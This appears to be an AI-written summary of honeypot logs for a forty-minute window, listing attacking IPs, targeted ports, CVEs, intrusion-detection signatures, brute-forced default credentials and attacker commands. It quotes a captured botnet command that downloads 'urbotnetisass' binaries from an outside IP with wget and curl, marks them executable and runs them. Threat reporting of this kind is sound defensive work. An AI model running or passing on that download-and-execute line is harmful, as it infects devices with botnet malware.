Here is the Honeypot Attack Summary Report.

### Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T08:01:34Z
**Timeframe of Analysis:** 2025-09-30T07:20:01Z to 2025-09-30T08:00:01Z
**Log Files Used:**
* `agg_log_20250930T072001Z.json`
* `agg_log_20250930T074001Z.json`
* `agg_log_20250930T080001Z.json`

### Executive Summary

This report summarizes 18,918 events collected from the honeypot network. The majority of attacks were detected by the Cowrie, Dionaea, and Suricata honeypots. A significant portion of the attacks targeted port 445 (SMB). The most frequent attacker IP addresses were `171.102.83.142`, `115.127.73.10`, and `129.212.176.62`. Several CVEs were detected, with `CVE-2002-0013` and `CVE-2002-0012` being the most common. A notable command was repeatedly used to download and execute malicious files from `94.154.35.154`.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 4920
* Dionaea: 4783
* Suricata: 4426
* Honeytrap: 2984
* Ciscoasa: 1443
* Redishoneypot: 71
* Mailoney: 94
* Sentrypeer: 54
* Tanner: 47
* Adbhoney: 21
* H0neytr4p: 22
* ConPot: 17
* ElasticPot: 17
* Honeyaml: 10
* Miniprint: 8
* Ipphoney: 1

**Top Attacking IPs:**
* 171.102.83.142: 3806
* 115.127.73.10: 2714
* 129.212.176.62: 2163
* 176.126.62.203: 1256
* 196.251.88.103: 999
* 103.205.179.202: 789
* 195.140.215.17: 563
* 92.63.197.55: 362
* 185.156.73.167: 366
* 185.156.73.166: 366
* 92.63.197.59: 333
* 2.57.121.247: 192
* 80.113.20.70: 106
* 3.134.148.59: 106
* 3.131.215.38: 81
* 129.13.189.204: 64
* 204.76.203.28: 63
* 182.43.75.64: 53
* 130.83.245.115: 74
* 79.124.56.138: 59

**Top Targeted Ports/Protocols:**
* 445: 4677
* TCP/445: 2710
* 22: 984
* 8333: 157
* 6379: 68
* 25: 94
* TCP/22: 77
* 5060: 46
* 80: 47
* 9000: 44
* 1433: 18
* TCP/1433: 13
* 27017: 14
* 81: 25
* 9158: 19
* 3306: 17
* 21313: 17
* UDP/161: 16
* 8060: 18
* 2222: 12

**Most Common CVEs:**
* CVE-2002-0013 CVE-2002-0012
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
* CVE-2021-3449 CVE-2021-3449
* CVE-2019-11500 CVE-2019-11500
* CVE-2005-4050
* CVE-2006-2369

**Commands Attempted by Attackers:**
* `uname -s -v -n -r -m`
* `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...` (truncated for brevity)
* `uname -a`
* `whoami`

**Signatures Triggered:**
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
* 2024766
* ET DROP Dshield Block Listed Source group 1
* 2402000
* ET SCAN NMAP -sS window 1024
* 2009582
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* 2023753
* ET SCAN Potential SSH Scan
* 2001219
* ET INFO Reserved Internal IP Traffic
* 2002752
* ET HUNTING RDP Authentication Bypass Attempt
* 2034857
* ET DROP Spamhaus DROP Listed Traffic Inbound group 32
* 2400031
* ET CINS Active Threat Intelligence Poor Reputation IP group 48
* 2403347
* ET CINS Active Threat Intelligence Poor Reputation IP group 45
* 2403344

**Users / Login Attempts (user/pass):**
* sa/0852
* example/
* root/kjashd123sadhj123d1SS
* admin/kjashd123sadhj123d1SS
* steam/steam
* git/git
* pi/raspberry
* root/1Q2W3E4R
* docker/docker
* user1/user1
* ubnt/ubnt
* user/111111
* jenkins/jenkins
* root/!QAZ2wsx
* root/!qaz@WSX
* plex/plex
* tom/tom
* root/1
* elsearch/elsearch
* gitlab-runner/gitlab-runner

**Files Uploaded/Downloaded:**
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* 11
* fonts.gstatic.com
* css?family=Libre+Franklin...
* ie8.css?ver=1.0
* html5.js?ver=3.7.3

**HTTP User-Agents:**
* N/A

**SSH Clients:**
* N/A

**SSH Servers:**
* N/A

**Top Attacker AS Organizations:**
* N/A

### Key Observations and Anomalies

*   The command to download and execute `*.urbotnetisass` files from `94.154.35.154` was observed multiple times across different time slices, indicating a persistent, automated attack campaign.
*   The high number of events related to the DoublePulsar backdoor suggests that attackers are actively exploiting SMB vulnerabilities.
*   The wide range of usernames and passwords attempted in brute-force attacks indicates a non-targeted, opportunistic approach.
*   No HTTP User-Agents, SSH clients/servers, or AS organizations were recorded in this period. This could be due to the nature of the attacks or a gap in logging.
